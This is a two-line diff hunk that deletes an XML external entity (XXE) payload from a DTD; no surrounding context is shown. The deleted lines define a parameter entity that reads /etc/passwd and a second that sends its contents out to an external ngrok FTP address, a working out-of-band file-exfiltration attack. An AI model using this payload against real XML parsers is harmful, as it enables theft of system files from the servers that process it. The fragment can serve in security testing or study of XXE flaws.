@@ -1,2 +1,0 @@
-<!ENTITY % b SYSTEM "file:///etc/passwd">
-<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://2.tcp.eu.ngrok.io:14295/%b;'>">
